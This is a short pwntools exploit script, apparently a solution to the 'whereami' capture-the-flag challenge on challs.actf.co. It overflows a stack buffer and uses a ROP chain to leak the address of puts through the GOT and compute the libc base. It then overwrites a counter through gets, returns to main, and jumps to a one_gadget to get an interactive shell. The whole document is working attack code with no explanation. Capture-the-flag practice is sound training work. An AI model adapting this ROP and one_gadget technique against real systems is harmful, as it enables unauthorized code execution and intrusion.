from pwn import *
import time

#elf = ELF("./whereami")
elf = ELF("./whereami_patched")
libc = ELF("./libc.so.6")

#sock = gdb.debug(elf.path)
#sock = process(elf.path)
sock = remote("challs.actf.co", 31222)

addr_couter = 0x40406c
pop_rdi = 0x0000000000401303 #: pop rdi ; ret
ret = 0x000000000040101a

payloads = b"A" * 0x48
payloads += p64(ret)
payloads += p64(pop_rdi)
payloads += p64(elf.got["puts"])
payloads += p64(elf.plt["puts"])

payloads += p64(pop_rdi)
payloads += p64(addr_couter)
payloads += p64(elf.plt["gets"])

payloads += p64(elf.sym["main"])

sock.sendlineafter(b"Who are you? ", payloads)
sock.recvuntil(b"I hope you find yourself too.\n")
leak_addr_got_puts = u64(sock.recvline()[:-1].ljust(8,b"\00"))
addr_libc_base = leak_addr_got_puts - libc.sym["puts"]
log.info("leak_addr_got_puts = " + hex(leak_addr_got_puts))
log.info("addr_libc_base = " + hex(addr_libc_base))

sock.sendline(p64(0))

time.sleep(0.1)

#addr_one_gadget = addr_libc_base + 0xe3b2e
addr_one_gadget = addr_libc_base + 0xe3b31
log.info("addr_one_gadget = " + hex(addr_one_gadget))

payloads = b"A" * 0x48
payloads += p64(addr_one_gadget)
sock.sendlineafter(b"Who are you? ", payloads)

sock.interactive()
